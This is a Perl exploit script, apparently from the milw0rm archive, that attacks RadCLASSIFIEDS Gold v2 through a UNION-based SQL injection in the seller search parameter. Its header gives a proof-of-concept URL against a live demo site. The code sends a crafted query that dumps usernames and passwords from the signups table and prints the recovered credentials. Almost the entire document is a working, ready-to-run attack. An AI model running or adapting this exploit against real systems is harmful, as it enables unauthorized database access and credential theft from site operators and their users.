#!usr/bin/perl
#|------------------------------------------------------------------------------------------------------------------
#| -Info:
# 
#| -Name: RadCLASSIFIEDS Gold v2
#| -Site: http://radscripts.com/
#| -Site Demo: http://www.radclassifieds.com
#| -Bug: Sql Injection
#| -Found: by Br0ly
#| -BRAZIL >D
#| -Contact: br0ly[dot]Code[at]gmail[dot]com
#|
#| -Gretz: Osirys , xs86 , str0ke, 0ut0fBound , c0d3_z3r0
#|
#| -p0c:
#| -SQL INJECTION: 
#|  
#|  -9999+union+all+select+0,1-- 
#|
#| - Demo ONline:
#|
#| -> http://www.radclassifieds.com/index.php?a=search&type=Any&search=1&seller=-9999+union+all+select+@@version,1--
#|	
#|
#| -Exploit: Demo:
#|
#|perl radclassifieds.txt http://www.radclassifieds.com/
#|
#|  --------------------------------------
#|   -RadCLASSIFIEDS                      
#|   -Sql Injection                       
#|   -by Br0ly                            
#|  --------------------------------------
#|
#|[+] Getting LOGIN and PASS
#|[+] LOGIN   = chub
#|[+] PASS    = chub
#|
#|
#| OBS: This IS only a Demo..
#|
#|
  use IO::Socket::INET;
  use LWP::UserAgent;
  
   my $host    = $ARGV[0];
   my $sql_path = "/index.php?a=search&type=Any&search=1&seller=";
    
  
  if (@ARGV < 1) {
      &banner();
      &help("-1");
  }

  elsif(cheek($host) == 1) {
	  &banner();
	  &xploit($host,$sql_path);
  }
  
  else {
      &banner();
      help("-2");
  }
  
  sub xploit() {

      my $host     = $_[0];
      my $sql_path = $_[1];

      print "[+] Getting LOGIN and PASS\n";

      my $sql_atk = $host.$sql_path."-9999+union+all+select+concat(0x6272306c79,0x3a,user,0x3a,password,0x3a,0x6272306c79),1+from+radclassifieds_signups--";
      print "$sql_atk";
      my $sql_get = get_url($sql_atk);
      my $connect = tag($sql_get); 
      
      if($connect =~ /br0ly:(.+):(.+):br0ly/) {
	
        print "[+] LOGIN   = $1\n";
	print "[+] PASS    = $2\n";
    
      }

      else {
	print "[-] Exploit, Fail\n";
      }
 }

   sub get_url() {
    $link = $_[0];
    my $req = HTTP::Request->new(GET => $link);
    my $ua = LWP::UserAgent->new();
    $ua->timeout(5);
    my $response = $ua->request($req);
    return $response->content;
  }

  sub tag() {
    my $string = $_[0];
    $string =~ s/ /\$/g;
    $string =~ s/\s/\*/g;
    return($string);
  }

  sub cheek() {
    my $host  = $_[0];
    if ($host =~ /http:\/\/(.*)/) {
        return 1;
    }
    else {
        return 0;
    }
  }

  sub help() {

    my $error = $_[0];
    if ($error == -1) {
        print "\n[-] Error, missed some arguments !\n\n";
    }
    
    elsif ($error == -2) {

        print "\n[-] Error, Bad arguments !\n";
    }
  
    print "[*] Usage : perl $0 http://localhost/RadCLASSIFIEDS/\n\n";
    print "    Ex:     perl $0 http://localhost/RadCLASSIFIEDS/\n\n";
    exit(0);
  }

  sub banner {
    print "\n".
          "  --------------------------------------\n".
          "   -RadCLASSIFIEDS                      \n".
          "   -Sql Injection                       \n".
          "   -by Br0ly                            \n".
          "  --------------------------------------\n\n";
  }

# milw0rm.com [2009-06-01]
